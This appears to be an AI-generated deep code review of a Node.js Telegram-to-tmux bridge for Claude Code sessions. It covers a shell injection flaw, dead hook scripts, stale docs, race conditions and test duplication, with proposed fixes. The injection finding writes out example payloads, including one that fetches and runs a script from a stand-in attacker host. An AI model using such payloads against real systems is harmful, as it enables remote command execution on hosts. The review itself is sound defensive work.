---
phase: cleanup
reviewed: 2026-10-05T10:39:36Z
depth: deep
files_reviewed: 46
files_reviewed_list:
  - src/index.js
  - src/auth.js
  - src/config.js
  - src/diagnostics.js
  - src/projects/manager.js
  - src/projects/menu.js
  - src/projects/orca_reader.js
  - src/skills/menu.js
  - src/skills/scanner.js
  - src/tmux/controller.js
  - src/tmux/formatter.js
  - src/tmux/monitor.js
  - src/tmux/question_handler.js
  - src/tmux/session_reader.js
  - src/utils/messenger.js
  - src/utils/telegram_chunker.js
  - hooks/claude-session-id-sync.sh
  - hooks/claude-bridge-settings.generated.json
  - hooks/telegram-bridge-start.sh
  - hooks/telegram-bridge-stop.sh
  - telegram-bridge-setup/scripts/setup.sh
  - telegram-bridge-setup/SKILL.md
  - README.md
  - COOLIFY_DEPLOY.md
  - Dockerfile
  - .dockerignore
  - .env.example
  - .gitignore
  - package.json
  - test/auth.test.js
  - test/chunker.test.js
  - test/config.test.js
  - test/diagnostics.test.js
  - test/e2e_verify.sh
  - test/formatter.test.js
  - test/integration.test.js
  - test/messenger.test.js
  - test/monitor.test.js
  - test/orca_reader.test.js
  - test/plugin_skills.test.js
  - test/project_manager.test.js
  - test/question_handler.test.js
  - test/session_reader.test.js
  - test/skills_discovery.test.js
  - test/skills_menu.test.js
  - test/skills_scanner.test.js
  - test/tmux.test.js
  - test/wsl_launch.test.js
findings:
  blocker: 2
  warning: 8
  info: 11
  total: 21
status: issues_found
---

# Cleanup Phase: Code Review Report

**Reviewed:** 2026-10-05T10:39:36Z
**Depth:** deep
**Files Reviewed:** 46
**Status:** issues_found

## Summary

Deep review of the whole repo (all 15 src modules, hooks, setup skill, Dockerfile, docs, and all 19 test files). Every src module IS imported somewhere, so dead code was hunted at function/export level and verified by grepping the entire repo including Dockerfile, package.json, hooks, and setup.sh. Top issues:

1. **CRITICAL — shell command injection** in `TmuxController.sendKeys` (BL-1). User-supplied Telegram text is interpolated into a `child_process.exec` command string with only `"` escaped; `$()`/backticks inside the double-quoted `-l "…"` region are expanded by `/bin/sh`, so any whitelisted Telegram user can execute arbitrary host commands, and even benign text containing `$` or backticks is silently corrupted before it reaches tmux.
2. **CRITICAL — disconnected start/stop hooks** (BL-2): `hooks/telegram-bridge-start.sh`, `telegram-bridge-stop.sh` and their `.claude/hooks` duplicates point at a `claude-telegram-bridge` directory that no longer exists in this repo layout, and nothing anywhere (no settings.json in repo or workspace) registers them. Full dead/broken feature.
3. Dead modules confirmed: `src/tmux/monitor.js`, `src/tmux/formatter.js` (and `TmuxController.sendKeySequence`) are wired into nothing but their own tests — yet README still documents the dead pipeline.
4. Doc drift: README/COOLIFY_DEPLOY/setup.sh/SKILL.md all reference the old nested `claude-telegram-bridge` layout and stale builtin lists / decommissioned LiteLLM gateway.

All suspected dead test files were verified live: `test/wsl_launch.test.js` and `test/plugin_skills.test.js` import modules that exist (`ProjectManager`, `scanPluginSkills`), and every test file imports only real modules — no orphaned test files.

Note: `hooks/claude-bridge-settings.generated.json` on disk contains a stale Windows path (`…\claude-code-telegram-coolify\claude-telegram-bridge\hooks\…`) from the removed nested layout. It is gitignored and regenerated at every daemon startup, so this is cosmetic (IN-8), not a runtime defect.

## Critical Issues

### BL-1: Shell command injection in TmuxController (sendKeys / newSession / setSessionOption)

**File:** `src/tmux/controller.js:65-72` (also 46-53, 107-111)

**Issue:** `sendKeys` builds a command string by trivial string interpolation and runs it through `child_process.exec`, which spawns `/bin/sh -c`. It escapes only double quotes:

```js
const escaped = text.replace(/"/g, '\\"');
let cmd = `${this.tmuxPath} send-keys -t "${sessionName}" -l "${escaped}"`;
```

Inside the double-quoted `-l "…"` region the shell still expands `$()` and backticks. `src/index.js:632` passes raw Telegram user text (`Telegram user: ${text}`) into this function, so any whitelisted Telegram user sending `$(reboot)` or `` `curl evil.sh|sh` `` executes arbitrary shell commands on the host as the daemon user (in production: root-equivalent control of the VPS via the bridge). Even benign text containing `$PATH`, `$5`, or backticks is mangled (expanded/emptied) before reaching Claude — input corruption on every message that contains a `$`. The same interpolation pattern exists in `newSession` (`safeCmd`/`safeCwd`, line 46-53) and `setSessionOption` (line 107-111), where `cwd` comes from external `orca-data.json` data.

**Fix:** Stop building shell strings for values that come from outside — use `execFile` with an argv array; tmux accepts arguments directly:

```js
import { execFile as defaultExecFile } from 'node:child_process';

async sendKeys(sessionName, text, pressEnter = true) {
  await this.runAsync(this.tmuxPath, ['send-keys', '-t', sessionName, '-l', text]);
  if (pressEnter) {
    await this.runAsync(this.tmuxPath, ['send-keys', '-t', sessionName, 'Enter']);
  }
}
```

Apply the same argv-array pattern to `newSession`, `setSessionOption`, and `capturePane`. The existing tests (`test/tmux.test.js`, `test/question_handler.test.js`) already stub the exec callback, so they can be adapted to assert argv arrays instead of a rendered string.

### BL-2: Start/stop hook scripts are dead and point at a directory that no longer exists

**File:** `hooks/telegram-bridge-start.sh:12-14`, `hooks/telegram-bridge-stop.sh:4`, `.claude/hooks/telegram-bridge-start.sh:12-14`, `.claude/hooks/telegram-bridge-stop.sh:4`

**Issue:** Three compounding problems, verified repo-wide:

1. **Broken paths.** Both copies compute `WORKSPACE_DIR="$(cd "$SCRIPT_DIR/../..")"` and then `BRIDGE_DIR="$WORKSPACE_DIR/claude-telegram-bridge"`. This repo is `claude-code-telegram-coolify` with the daemon at the repo **root** (`src/index.js`, `package.json` at root); there is no nested `claude-telegram-bridge` directory and no sibling one in the workspace. For the `hooks/` copy, `WORKSPACE_DIR` resolves to the *parent of the repo*, for the `.claude/hooks` copy to the repo root — in both cases `BRIDGE_DIR` does not exist, so the script exits silently at the `$BRIDGE_DIR/.env` guard. The daemon auto-start feature can never fire.
2. **No registration.** Repo-wide grep (including Dockerfile, package.json, setup.sh, all docs) finds zero references to `telegram-bridge-start` / `telegram-bridge-stop`; neither the repo's nor the workspace's `.claude/settings.json` / `settings.local.json` defines a hooks entry. Nothing loads these scripts even if the paths were right.
3. **Mutually inconsistent PID paths.** `hooks/telegram-bridge-start.sh:14` writes `$WORKSPACE_DIR/.claude/telegram-bridge.pid` (= parent-of-repo/.claude/…), while the sibling `hooks/telegram-bridge-stop.sh:4` reads `$SCRIPT_DIR/../telegram-bridge.pid` (= repo-root/telegram-bridge.pid). Even with the dir bug fixed, the stop hook could never find the stop hook's PID file.

**Fix:** These scripts are dead weight in the current deployment topology (VPS daemon starts via Docker `CMD`, local Linux via systemd per README). Either delete `hooks/telegram-bridge-start.sh`, `hooks/telegram-bridge-stop.sh` and the whole duplicated `.claude/hooks/` directory, or rewrite them to point `BRIDGE_DIR` at the repo root (`SCRIPT_DIR/..`) and register both scripts in a `.claude/settings.json` hooks block. Do not keep the current state — it ships a fake capability that silently never works.

## Warnings

### WR-1: Unhandled rejections and missing `answerCbQuery` in callback handlers

**File:** `src/index.js:327-407` (esp. `skill_run_now` 327-339, `skill_run_args` 341-351, `skill_choice` 353-366, `proj_start` 386-407)

**Issue:** None of the action handlers wrap their tmux calls in try/catch. If `startFreshSession`/`sendKeys` throws (tmux transient error, dead server), the rejection is unhandled inside the Telegraf handler and the user gets neither a feedback message nor an answered callback — the inline button just spins until Telegram timeout. Additionally, the early-return "no active session" paths (`index.js:332`, `358`) `return ctx.reply(...)` without `ctx.answerCbQuery()`, leaving the spinner hanging even though the error is known.

**Fix:** Wrap each handler body:

```js
try {
  // ... existing logic
} catch (err) {
  console.warn('⚠️ action failed:', err.message);
  await ctx.reply(`⚠️ Action failed: ${err.message}`);
} finally {
  await ctx.answerCbQuery().catch(() => {});
}
```

### WR-2: Question/pending-args state survives session switches — keys can be injected into the wrong session

**File:** `src/index.js:177-246` (`switchActiveSession`)

**Issue:** `switchActiveSession` stops typing, stops the reader, and resets `lastInjectedPrompt`, but never resets `activeQuestion` or `pendingArgsSkill`. A question card left open from project A remains actionable after the user switches to project B: tapping `✅ Submit` (`submit_q`, index.js:544) passes the aliveness check against the *new* session and injects Enter/Right/Space keys into project B's pane. Same for a pending "run with arguments" skill (index.js:572-582) — the next text becomes args for the old skill in the new session.

**Fix:** In `switchActiveSession`, add `activeQuestion = null; pendingArgsSkill = null;`.

### WR-3: proj_kill misses prefixed session names, leaving the connection stale

**File:** `src/index.js:428-436` vs `src/projects/manager.js:92`

**Issue:** `listProjects` treats a project's sessions as `claude-<norm>` **and** `claude-<norm>-*` (manager.js:92), but `proj_kill` only clears the active connection when `activeSessionName` **exactly** equals `claude-<norm>`. If the active session is a prefixed variant (`claude-web-2`), the kill succeeds (`killProjectSessions` kills it) but the connection is never cleared: the reader keeps polling a dead transcript and Telegram injections continue failing until the unrelated typing-tick death check eventually notices. Also, when the target `projectName` fails to normalize identically to the active session's project, the check silently misfires.

**Fix:** In the kill handler, derive the cleared predicate from the manager logic, e.g.:

```js
const targetPrefix = `claude-${projectManager.normalizeSessionName(projectName)}`;
if (activeSessionName === targetPrefix || activeSessionName.startsWith(`${targetPrefix}-`)) {
  switchActiveSession(null, null, null);
}
```

### WR-4: Dead production modules: TmuxMonitor, formatter exports, sendKeySequence

**File:** `src/tmux/monitor.js` (whole file), `src/tmux/formatter.js:17-63`, `src/tmux/controller.js:74-79`

**Issue:** Verified by grep across all of src/, test/, Dockerfile, package.json and setup.sh:

- `TmuxMonitor` is imported only by `test/monitor.test.js`. It is not wired into `createBot` — output streaming is done by `ClaudeSessionReader` reading transcript JSONL.
- `formatTerminalOutput` and `cleanTerminalOutput` are imported only by `test/formatter.test.js`; `cleanAnsi` is reachable in production only via the dead `TmuxMonitor`.
- `TmuxController.sendKeySequence` (controller.js:74-79) has no caller other than its own test (its live cousin `sendKeysWithDelay` is used).

That is ~180 lines of src code plus `test/monitor.test.js` and `test/formatter.test.js` kept alive for nothing, and it makes the module graph misleading (a reader sees `cleanAnsi` imported and assumes ANSI cleaning is part of the live pipeline).

**Fix:** Delete `src/tmux/monitor.js`, `src/tmux/formatter.js`, `test/monitor.test.js`, `test/formatter.test.js`, and the `sendKeySequence` method. If pane capture ever returns to the pipeline, resurrect it from git.

### WR-5: README describes removed/dead features and the old layout

**File:** `README.md:13, 31, 58, 138`

**Issue:** Verified drift:

- Line 13 (and the `/skills` row) claims built-in commands `/clear`, `/compact`, `/doctor`, `/help` — actual builtins are `/clear`, `/compact`, `/model`, `/effort` (`src/skills/scanner.js:6-13`); `/doctor`/`/help` are not builtins.
- Line 31 architecture diagram: "Output Monitor (tmux capture-pane -> clean ANSI -> debounce -> chunk)" — that pipeline (`TmuxMonitor` + `formatter`) is exactly the dead code from WR-4; the live path is transcript JSONL streaming via `ClaudeSessionReader`.
- Lines 58 and 138: quickstart `cd claude-code-telegram/claude-telegram-bridge` and systemd `WorkingDirectory=/home/your-username/claude-code-telegram/claude-telegram-bridge` reference the old nested layout; the daemon now lives at the repo root.

**Fix:** Update the builtin list, replace the Output Monitor diagram line with the transcript-reader pipeline (`ClaudeSessionReader` — `.jsonl` polling), and fix the two path references to the repo root.

### WR-6: setup.sh resolves the bridge directory outside the repo — fails in every checkout

**File:** `telegram-bridge-setup/scripts/setup.sh:10`

**Issue:** `BRIDGE_DIR="$(cd "$SCRIPT_DIR/../../../../claude-telegram-bridge" ...)"`. From `<repo>/telegram-bridge-setup/scripts`, four levels up plus `claude-telegram-bridge` lands at `<Documents>/claude-code-projects/claude-telegram-bridge` — outside the repo entirely. In any fresh clone the script dies with "❌ Error: Bridge directory not found", making the bundled "Quick Automated Setup" (SKILL.md step 1) permanently broken. SKILL.md's prose ("Edit `claude-telegram-bridge/.env`", "cd claude-telegram-bridge && npm test") repeats the stale layout.

**Fix:** `BRIDGE_DIR="$(cd "$SCRIPT_DIR/../.." && pwd)"` — the repo root is two levels up from the script dir — and drop the `|||| true` fallback that converts a bad path into a confusing error. Update SKILL.md paths to the repo root.

### WR-7: COOLIFY_DEPLOY references dead directory and decommissioned gateway

**File:** `COOLIFY_DEPLOY.md:6, 18-20`

**Issue:** Line 6 tells the deployer to set base directory `/claude-telegram-bridge` — no such subdirectory exists in this repo (build would fail unless the deployer already knows to use `/`). Lines 18-20 prescribe `ANTHROPIC_BASE_URL=http://100.65.54.114:4000`, `ANTHROPIC_AUTH_TOKEN=<litellm-master-key>`, `ANTHROPIC_MODEL=glm-5.3-flash:cloud` — the LiteLLM gateway at that address has been decommissioned (services now call ollama.com directly); following this doc verbatim deploys a daemon that cannot reach its LLM. The token/user-id walkthrough here also duplicates README Prerequisites and SKILL.md Steps 1-2 (three copies of the same instructions to keep in sync).

**Fix:** Update base directory to `/`, replace the gateway vars with the current direct-to-ollama.com env (`ANTHROPIC_BASE_URL=https://ollama.com` + `ANTHROPIC_AUTH_TOKEN` from ollama.com), and keep only one canonical credentials walkthrough (README) with a link from here and SKILL.md.

### WR-8: `getBoundSessionId` closure outlives its session's reader — bound-id rebind writes into a possibly orphaned reader

**File:** `src/index.js:236-244` with `src/tmux/session_reader.js:191-216`

**Issue:** The reader started by `switchActiveSession` captures `getBoundSessionId: () => tmux.getSessionOption(sessionName, …)` for the tmux session captured at switch time. The daemon-side code stops the reader on session death/switch, so the exposure window is small, but within it there is a genuine race: the reader's 5th-tick rebind (`session_reader.js:196-216`) resolves `trackedFile` from `projectPath` even when `stop()` was never called because `switchActiveSession` was replaced mid-`await` (the async interval callback can be between the rebind and the next event dispatch when the daemon clears the reader). Combined with `lastFileOffsets` never being cleaned when switching (entries accumulate per-tracked-file for the life of the daemon), events from an old session's file can in principle fire into `activeChatId` after a fast switch (the closure checks `activeChatId` but not *which* chat that belongs to). Practically this yields occasional misattributed echo messages after rapid `/proj_connect` swaps.

**Fix:** Dispatch events through a generation counter: increment a `sessionId-epoch` on every `switchActiveSession`, and drop events whose epoch differs (`const myEpoch = ++readerEpoch; … if (myEpoch !== readerEpoch) return;`).

## Info

### IN-1: Byte-duplicate hook scripts in `hooks/` and `.claude/hooks/`

**File:** `hooks/telegram-bridge-start.sh` ↔ `.claude/hooks/telegram-bridge-start.sh`, same for stop

**Issue:** The two copies are identical except for working-tree line endings (one copy LF, the other CRLF); both are committed (LF in git). Resolved together with BL-2's fix — keep exactly one copy.

### IN-2: No `.gitattributes` — all shell scripts appear CRLF in the Windows working tree

**File:** .gitattributes (missing) / all `*.sh` files

**Issue:** All scripts are stored LF in git, but `core.autocrlf=true` produced CRLF on-disk copies (verified by od: `hooks/claude-session-id-sync.sh` on disk has `0d0a`). Running these scripts from the Windows working tree via WSL or POSIX sh hits stray-CR tokens (`exit 0\r` → "bad number" under dash) and a broken `#!/bin/sh\r` shebang. Production Docker builds are unaffected (Linux checkout of the LF blobs), but local WSL testing will quietly misbehave.

**Fix:** Add `.gitattributes` containing `*.sh text eol=lf` and `git add --renormalize .`.

### IN-3: Test helper duplication across six test files

**File:** `test/diagnostics.test.js:11-18` & `20-27`, `test/skills_discovery.test.js:12-20`, `test/skills_scanner.test.js:37-40`, `test/plugin_skills.test.js:11-18`, `test/integration.test.js` (mockBot/mockTmux/config triple, 19 near-identical copies)

**Issue:** `makeSkill` is re-implemented three times (diagnostics, skills_discovery, skills_scanner), `makePluginSkill` twice (diagnostics, plugin_skills), and `integration.test.js` hand-rolls the same stub bot + stub tmux + config object 19 times in one file.

**Fix:** Create `test/helpers.js` exporting `makeSkill`, `makePluginSkill`, `makeBotMock()`, `makeTmuxMock(overrides)`, and `defaultTestConfig`, and import them.

### IN-4: Useless ternary in wsl launch test stub

**File:** `test/wsl_launch.test.js:11`

**Issue:** `hasSession: async (name) => calls.killed.includes(name) ? false : false` — both branches are `false`; the ternary narrates an intent ("alive checks after kill") that the stub never implements.

**Fix:** `hasSession: async () => false`.

### IN-5: `formatQuestionCard` returns metadata nobody consumes

**File:** `src/tmux/question_handler.js:138-146`

**Issue:** The `multiSelect`, `questionsCount`, and `optionsCount` fields on the returned card are read only by `test/question_handler.test.js`; `src/index.js` uses only `card.text` and `card.reply_markup`. Speculative API surface for a card that is sent to Telegram.

**Fix:** Drop the three fields (and their test assertions) or document a consumer.

### IN-6: Redundant double-stat in orca_reader

**File:** `src/projects/orca_reader.js:29-35`

**Issue:** The default-path pre-check does `fs.access` then immediately `fs.readFile` — the access check can never change the outcome and duplicates the failure handling of the subsequent catch. The `filePath === getDefaultOrcaDataPath()` guard also calls the path function twice per read.

**Fix:** `try { content = await fs.readFile(filePath, 'utf8'); } catch { return []; }` — the catch already covers ENOENT.

### IN-7: `e2e_verify.sh` is `npm test` with a misleading name

**File:** `test/e2e_verify.sh:7-8`

**Issue:** The script runs `node --test test/*.test.js` — identical to `npm test` — and does no end-to-end verification (no daemon, no Telegram API, no tmux). The name implies integration coverage that does not exist.

**Fix:** Delete the script (the package.json `test` script already covers it), or rename it e.g. `run_tests.sh` if a shell entry point is wanted.

### IN-8: Stale generated settings JSON on disk references the removed nested layout

**File:** `hooks/claude-bridge-settings.generated.json:8` (untracked, gitignored)

**Issue:** The on-disk copy points the SessionStart hook at `…\claude-code-telegram-coolify\claude-telegram-bridge\hooks\claude-session-id-sync.sh` — a double-nested directory that no longer exists. Harmless at runtime (`generateHookSettings()` regenerates it at every daemon start, `src/projects/manager.js:15-35`, and the integration test asserts the regenerated path), but as a file present in the deliverable tree it documents a path that will never be valid.

**Fix:** Delete the on-disk copy; rely on startup regeneration for the runtime path.

### IN-9: Platform-dependent test branch is always taken / never tests the POSIX slug

**File:** `test/session_reader.test.js:16-18`

**Issue:** `const posixPath = path.win32 ? 'C:\\home\\user\\projects\\my-project' : '/home/user/projects/my-project'` — `path.win32` is an object that always exists on every platform, so the ternary is dead and the "POSIX style" branch of `getProjectSlug` is never tested anywhere on any OS, and the test name lies.

**Fix:** Replace with two explicit assertions using `path.posix` and `path.win32` slugs of known inputs.

### IN-10: `.dockerignore` lets planning artifacts and `.claude/` into the image

**File:** `.dockerignore:1-5`

**Issue:** The list covers `node_modules`, `.env`, `.git`, `test`, `*.md`, but `COPY --chown=orca:orca . .` (Dockerfile:30) also bakes in `.planning/` (codebase docs), `.claude/hooks/` (local hook copies), `.env.example`, and `telegram-bridge-setup/` into the deployed container. Not a vulnerability, just unnecessary image content; `*.md` filtering incidentally helps by excluding the tracked `.planning` markdown.

**Fix:** Add `.planning/`, `.claude/`, `telegram-bridge-setup/`, `.env.example` to `.dockerignore`, and add `hooks/claude-bridge-settings.generated.json` so a locally-stale generated file can never be baked in.

### IN-11: `claude-<name>` prefix strip/spawn duplicated in five places

**File:** `src/index.js:159, 190, 430`, `src/skills/scanner.js:37`, `src/diagnostics.js:42`, `src/projects/manager.js:91,107,128,136,137`

**Issue:** `activeSessionName.replace(/^claude-/, '')` (and the inverse `` `claude-${normalized}` `` construction) is hand-written in nine call sites across four modules. A change to the naming scheme must be made in nine places, and the coupling already caused the WR-3 style inconsistency.

**Fix:** Export `sessionNameFor(projectName)` / `projectNameFromSession(sessionName)` from `src/projects/manager.js` (it owns session naming) and use them everywhere.

---

_Reviewed: 2026-10-05T10:39:36Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: deep_